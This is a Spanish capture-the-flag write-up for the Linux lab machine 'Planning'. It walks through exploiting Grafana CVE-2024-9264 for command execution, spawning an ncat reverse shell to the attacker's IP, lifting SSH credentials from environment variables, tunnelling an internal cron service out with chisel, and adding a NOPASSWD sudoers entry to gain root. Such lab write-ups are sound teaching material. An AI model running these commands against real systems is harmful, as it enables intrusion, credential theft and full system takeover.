***
- Tags: 
***
Vamos a resolver la máquina Planning. 
- Categoría: Fácil
- Sistema: Linux
- IP: `10.10.11.68`

### 1. Enumeración

Lo primero en lo que nos fijamos es que nos dan credenciales: admin / 0D5oT70Fq13EvB5r
La enumeración inicial con nmap nos desvela la siguiente información:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La versión de SSH es muy moderna, por lo que probablemente no podremos explotar como tal este servicio. También el escaneo nos dice `Did not follow redirect to http://planning.htb/`, por lo que lo primero que hacemos es añadir al `/etc/hosts` la IP y el dominio `planning.htb`. Las credenciales proporcionadas no sirven para el acceso por SSH, así que dejamos aparcada esta parte y pasamos a la enumeración web ya que el puerto 80 se encuentra abierto.

Procedemos a realizar una enumeración de directorios, aunque sin mucho éxito:

![[Planning_1.png| 800]]

Así que pasamos a la enumeración de subdominios. Para ello usamos ffuf con el siguiente comando:

```
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -c -t 50 -fs 178 
```

Y tras un rato esperando, obtenemos esto:

```
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 48ms]
```

Añadimos el subdominio al `/etc/hosts`. Ahora podemos acceder. Nos pide usuario y contraseña, que son las facilitadas al principio. Si navegamos ahora por la web en busca de ka versión de Grafana que se está utilizando, vemos lo siguiente:

![[Planning_2.png]]

Y con una búsqueda en google para esta versión, descubrimos que es vulnerable a un exploit y tiene el CVE asociado `CVE-2024-9264`. Incluso existe en GitHub una prueba de concepto en este [enlace](https://github.com/nollium/CVE-2024-9264)
### 2. Explotación

Nos clonamos el script malicioso. Creamos un entorno virtualizado con python3:

```bash
1. python3 -m venv venv
2. source venv/bin/activate
3. pip install -r requirements.txt
```

Según el README.md el funcionamiento es el siguiente:

```bash
python3 CVE-2024-9264.py -u user -p user -c <shell-cmd> http://localhost:3000
```

> *También se incluyen lectura de archivos y querys de DuckDB, aunque nos interesa el de ejecución de comandos*

![[Planning_3.png]]
Vemos que funciona. Ahora el objetivo es ganar una reverse shell. Nos ponemos en escucha en nuestra máquina de atacante con `nc -nvlp 443` y vemos cómo proceder. Lo primero en lo que nos hemos fijado es que al enviar el comando `ls` ya estaba disponible la herramienta `ncat`, por lo que usamos la siguiente secuencia completa:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "./ncat 10.10.14.7 443 -e /bin/bash" http://grafana.planning.htb
```

Ya tenemos una terminal al usar ncat. Lamentablemente solo hemos ganado acceso a la máquina de grafana y no como root absoluto. Se trata entonces de una máquina Docker y no la máquina como tal. Pasamos a listar las variables de entorno:

```
root@7ce659d667d7:/root# cat /proc/1/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
GF_PATHS_HOME=/usr/share/grafana
HOME=/usr/share/grafana
SHLVL=0
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
```

Si nos fijamos bien, tenemos las credenciales SSH del usuario enzo. Las guardamos y nos conectamos por SSH.

```bash
ssh enzo@10.10.11.68    
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
...
enzo@planning:~$ 
```

Obtenemos la flag del usuario. 
### 3. Escalada de privilegios

En este punto vamos a tirar de `linpeas.sh` para ver de qué manera podríamos ganar privilegios, pues `sudo -l` no funciona, ni tampoco listar crontabs a primera vista. Dentro de `/tmp` ya se encuentra el script así que no hace falta subirlo desde local. Lo ejecutamos y vemos información bastante interesante:

![[Planning_4.png]]

Vemos que hay algunos puertos abiertos así que luego podemos usar port forwarding para acceder. Pero además, hay dos archivos `.db` que podemos leer, tal y como lista la herramienta.

![[Planning_5.png]]

Los archivos en cuestión son `/opt/crontabs/env.db` y  `/opt/crontabs/crontab.db`. El primero no contiene nada, pero el segundo contiene esta información:

```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Ese `P4ssw0rdS0pRi0T3c` parece la contraseña de root, pero no lo es, así que volvamos al tema del port forwarding. Hay varias formas, pero la más sencilla es usar la herramienta `chisel`, puesto que `socat` no está disponible. Paso por paso:

1. Descarga de chisel en nuestra máquina de atacante

```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64 chisel
chmod +x chisel
```

2. Subida de chisel a la máquina víctima

```
scp chisel enzo@10.10.11.68:/tmp/chisel
```

3. Lanzar servidor chisel en local (máquina atacante). 

```
./chisel server -p 9001 --reverse
```

> Le dices a `chisel` que se ponga en modo _servidor_, escuchando en el puerto `9001` y aceptando conexiones inversas desde clientes.  
> La opción `--reverse` permite que la víctima haga port forwarding **desde su red interna hacia ti** (lo cual es útil cuando estás en una red cerrada y no puedes tú acceder a sus servicios internos directamente).
> Este comando **NO hace nada aún**, solo queda esperando conexiones.

4. Establecer port forwarding en la máquina víctima

```
./chisel client 10.10.14.7:9001 R:8000:127.0.0.1:8000
```

🔹 **¿Qué haces aquí?**  
Le estás diciendo a la máquina víctima que:

- Se conecte a tu máquina atacante (`10.10.14.7:9001`)
- Y cree un túnel que exponga su **puerto local 127.0.0.1:8000** en tu máquina.

💡 Resultado: **en tu máquina**, ahora puedes acceder a `http://localhost:8000` y verás el servicio que solo estaba escuchando en `127.0.0.1:8000` dentro de la víctima.

Nos pide usuario y contraseña. Las credenciales son las obtenidas previamente en el archivo `.db` que vimos antes.

![[Planning_6.png]]

Es una página para crear cronjobs. Desde aquí es muy sencillo convertirnos en root. Simplemente creamos un nuevo cronjob con este comando:

```bash
echo "enzo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/enzo
```

Esto hará que el usuario enzo sea root al agregarle al grupo de sudores. Ya simplemente ejecutamos una bash como root y listo. 

```bash
enzo@planning:/tmp$ sudo su -
root@planning:~# 
```

Obtenemos la flag y finalizamos. 